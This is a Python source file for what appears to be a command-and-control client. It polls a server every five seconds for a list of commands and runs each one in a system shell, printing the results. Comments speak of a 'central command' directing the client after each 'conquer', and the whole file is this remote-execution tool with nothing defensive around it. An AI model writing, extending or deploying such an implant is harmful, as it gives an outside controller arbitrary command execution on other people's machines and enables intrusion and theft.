import subprocess
import os 
import requests
import time
import concurrent.futures

#ok so for each "conquer" we need the central command to be able to send a command to the client and have it execute it. This is done by having the client poll the server for commands and then executing them when they are received. That requires a running execution thread? I think we start basic for the thread, since response/execution can vary on environment.
class CommandExecutor:
    def __init__(self):
        self.command_queue = []
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=1)
        self.running = False
    def add_command(self, command):
        self.command_queue.append(command)
        if not self.running:
            self.running = True
            self.executor.submit(self.execute_commands)
    def execute_commands(self):
        while self.command_queue:
            command = self.command_queue.pop(0)
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                print(f"Command: {command}\nReturn Code: {result.returncode}\nOutput: {result.stdout}\nError: {result.stderr}")
            except Exception as e:
                print(f"Error executing command '{command}': {e}")
        self.running = False
    def poll_server_for_commands(self, server_url):
        while True:
            try:
                response = requests.get(server_url)
                if response.status_code == 200:
                    commands = response.json().get('commands', [])
                    for command in commands:
                        self.add_command(command)
                else:
                    print(f"Failed to poll server: {response.status_code}")
            except Exception as e:
                print(f"Error polling server: {e}")
            time.sleep(5) 
 # Poll every 5 seconds #TODO: make this just a config variable for the client to set, and have the server send it as well so we can change it on the fly
    def start_polling(self, server_url):
        polling_thread = concurrent.futures.ThreadPoolExecutor(max_workers=1)
        polling_thread.submit(self.poll_server_for_commands, server_url)

#ok this is amazing 
class CommandProcessor:
    def __init__(self, server_url):
        self.executor = CommandExecutor()
        self.server_url = server_url
    def start(self):
        self.executor.start_polling(self.server_url)
    def process_command(self, command):
        self.executor.add_command(command)
    def get_commands(self):
        return self.executor.command_queue
    def run_command(self, command):
        self.executor.add_command(command)



if __name__ == "__main__":
    server_url = "http://localhost:5000/commands"  # Replace with your server URL
    processor = CommandProcessor(server_url)
    processor.start()